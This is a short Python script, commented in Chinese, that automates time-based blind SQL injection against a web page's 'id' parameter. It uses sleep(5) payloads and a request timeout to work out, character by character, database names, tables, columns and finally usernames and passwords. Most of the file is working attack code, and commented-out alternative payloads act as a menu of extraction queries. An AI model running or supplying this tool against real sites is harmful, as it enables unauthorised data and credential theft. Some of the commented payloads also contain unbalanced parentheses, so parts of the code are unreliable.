import string

import requests


# 定义函数
# 注入判断标准
def chilk(url, method, param):
    if method == "POST":
        try:
            requests.post(url, data=param, timeout=3)
        except:
            return "success"
    else:
        try:
            req = requests.get(url, params=param, timeout=3)
        except:
            return "success"


# 判断查询数据的长度
def getlen(url, method):
    # 长度的遍历循环判断
    for i in range(300):
        data = {
            # 跑长度 【注意id为注入参数，即可注入的点。】
            # "id": f"1 and if((length((select database()))={i}), sleep(5),1)"
            # 跑所有数据库名长度
            # "id": f"1 and if((length((select group_concat(schema_name) from information_schema.schemata))={i}), sleep(5),1)"
            # 跑指定的数据库的数据表的长度
            # "id": f"1 and if((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={i}), sleep(5),1)"
            # 跑指定的数据库的数据表的字段的长度
            # "id": f"1 and if((length((select group_concat(column_name) from information_schema.columns where table_name=指定的表))={i}), sleep(5),1)"
            # 跑指定的数据库的数据表的字段的具体值的长度
            "id": f"1 and if((length((select group_concat(id,username,password) from 指定的表))={i}), sleep(5),1)"
        }
        req = chilk(url, method, data)
        if req == "success":
            print(f"db len is:{i}")
            return i


# 判断数据
def getdata(url, method):
    Getlen = getlen(url, method)
    d = ""
    for i in range(1, Getlen + 1):
        for j in dic:
            data = {
                # 跑数据库名 【注意key为注入参数，即可注入的点。】
                # "id": f"1 and if((substr((select database()),{i},1)='{j}'), sleep(5),1)"
                # 跑所有数据库名
                # "id": f"1 and if((substr((select group_concat(schema_name) from information_schema.schemata)),{i},1)='{j}'), sleep(5),1)"
                # 跑指定的数据库的数据表
                # "id": f"1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())),{i},1)='{j}'), sleep(5),1)"
                # 跑指定的数据库的数据表的字段
                # "id": f"1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name=指定表名)),{i},1)='{j}'), sleep(5),1)"
                # 跑指定的数据库的数据表的字段的具体值
                "id": f"1 and if((substr((select group_concat(id,username,password) from 指定表名)),{i},1)='{j}'), sleep(5),1)"
            }
            req = chilk(url, method, data)
            if req == "success":
                d += j
                print(f"data is : {d}")
                break

# 主函数，接入参数URL
if __name__ == "__main__":
    url = ''                                        # 输入该web端的注入链接
    dic = string.printable
    getdata(url, "get")                            # 确定请求方式POST还是GET
    # getlen(url)
